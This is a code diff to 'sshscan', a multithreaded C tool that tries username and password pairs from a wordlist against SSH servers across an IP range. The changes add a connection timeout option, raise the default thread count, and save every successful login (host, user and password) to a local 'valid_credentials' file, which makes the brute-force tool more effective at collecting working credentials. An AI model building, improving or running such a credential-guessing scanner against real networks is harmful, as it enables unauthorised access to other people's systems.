@@ -1,18 +1,20 @@
 #include "sshscan.h"
 
-int nproc = 0;
+int nproc = 10;
 FILE *fp;
 unsigned int wlen = 0;
 uint32_t n = 0;
 char buff[MAX_WORD_SIZE];
 uint8_t verbose = 0;
 uint32_t port = 22;
+unsigned long timeout = 3;
 
 void help(){
     printf("\nMultithreaded SSH scan tool for networks\n");
     printf("Use: sshscan [OPTIONS] [USER_PASSW FILE] [IP RANGE]\n");
     printf("Options:\n");
-    printf("\t-t [NUMTHREADS]: Change the number of threads used. Default is %d\n",DEFAULT_THREADPOOL_SIZE);
+    printf("\t-t [NUMTHREADS]: Change the number of threads used. Default is %d\n",nproc);
+    printf("\t-s [TIMEOUT]: Change the timeout for the connection in seconds. Default is %ld\n",timeout);
     printf("\t-p [PORT]: Specify another port to connect to\n");
     printf("\t-h : Show this help\n");
     printf("\t-v : Verbose mode\n");
@@ -64,6 +66,7 @@ int ConnectSSH(uint32_t ipaddr, char* user, char *passwd){
     ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip2str(ipaddr));
     ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &timeout);
 
     // Connect to server
     rc = ssh_connect(my_ssh_session);
@@ -81,6 +84,11 @@ int ConnectSSH(uint32_t ipaddr, char* user, char *passwd){
         return return_val;
     }else if(rc == SSH_AUTH_SUCCESS){
         printf(ANSI_COLOR_BOLD"[%s]"ANSI_COLOR_ENDC" Succeed with user:%s  pass:%s\n",ip2str(ipaddr),user,passwd);
+
+	FILE *f = fopen("valid_credentials", "a");
+	fprintf(f, "[%s][%s:%s]\n",ip2str(ipaddr),user,passwd);
+	fclose(f);
+
         return_val=1;
     }
     ssh_disconnect(my_ssh_session);
@@ -127,11 +135,14 @@ int main(int argc, char ** argv){
       case 't':
         nproc = atoi(optarg);
         break;
+      case 's':
+        timeout = atol(optarg);
+        break;
       }
     
     if(argc-optind!=2){
-        printf("Wrong number of arguments\nHint:\t %s X.X.X.X/X testfile\n",argv[0]);
-        exit(0);
+	help();
+	exit(0);
     }
     
     ssh_threads_set_callbacks(ssh_threads_get_pthread());
@@ -205,7 +216,6 @@ int main(int argc, char ** argv){
         if(targs[n].solution!=-1) autenticated++;
     }
     
-    printf("%d direcciones analizadas, %d direcciones vulnerables\n",nhosts,autenticated);
     /*
     for(n=0;n<nhosts;n++){
         int solindx = targs[n].solution;
